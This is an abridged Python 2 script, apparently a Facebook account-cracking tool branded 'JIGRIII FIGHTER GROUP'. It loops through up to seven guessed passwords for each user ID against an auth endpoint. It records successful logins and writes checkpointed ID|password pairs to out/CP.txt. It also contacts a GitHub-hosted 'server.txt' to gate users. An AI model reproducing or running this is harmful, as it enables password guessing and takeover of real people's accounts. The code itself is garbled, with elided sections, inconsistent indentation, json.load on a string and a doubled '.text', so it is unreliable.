...
try:
    ...
    __author__ = 'jigrii'
    __copyright = 'All rights reserved . Copyright  jigrii'
...
\033[1;92m
         ...
         JIGRIII FIGHTER GROUP
         
        BHAROSA KABHI NA KRNA
\033[1;90m --------------------------------------------
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/sanwalhacker/jigrii/main/server.txt').text
    if to in r:
        ...
        os.system('xdg-open https://www.facebook.com/muhammadsanwal.sheby')
        reg()
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\033[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
				oks.append(uid+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;31;1m[CP] ' + uid + ' | ' + pass1	
					...
					data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
		                        q = json.load(data)
					if 'access_token' in q:
						print '\033[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'	
						oks.append(uid+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;31;1m[CP] ' + uid + ' | ' + pass2
							cek = open("out/CP.txt", "a")
							cek.write(uid+"|"+pass2+"\n")
							cek.close()
							...
							data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
		                                        q = json.load(data)
							if 'access_token' in q:
								print '\033[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
								oks.append(uid+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;31;1m[CP] ' + uid + ' | ' + pass3	
									cek = open("out/CP.txt", "a")
									cek.write(uid+"|"+pass3+"\n")
									cek.close()
									...
									data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
		                                                        q = json.load(data)
									if 'access_token' in q:
										print '\033[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'	
										oks.append(uid+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;31;1m[CP] ' + uid + ' | ' + pass4
											cek = open("out/CP.txt", "a")
											cek.write(uid+"|"+pass4+"\n")
											cek.close()
											...
											data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
		                                                                        q = json.load(data)
											if 'access_token' in q:
												print '\033[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
												oks.append(uid+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;31;1m[CP] ' + uid + ' | ' + pass5	
													cek = open("out/CP.txt", "a")
													cek.write(uid+"|"+pass5+"\n")
													cek.close()
													...
													data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
		                                                                                        q = json.load(data)
													if 'access_token' in q:
														print '\033[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
														oks.append(uid+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\033[1;31;1m[CP] ' + uid + ' | ' + pass6	
															cek = open("out/CP.txt", "a")
															cek.write(uid+"|"+pass6+"\n")
															cek.close()
															...
															data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text.text
		                                                                                                        q = json.load(data)
															if 'access_token' in q:
																print '\033[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
																oks.append(uid+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\033[1;31;1m[CP] ' + uid + ' | ' + pass7
																	cek = open("out/CP.txt", "a")
                                                                                                                                        cek.write(uid+"|"+pass7+"\n")
																	cek.close()
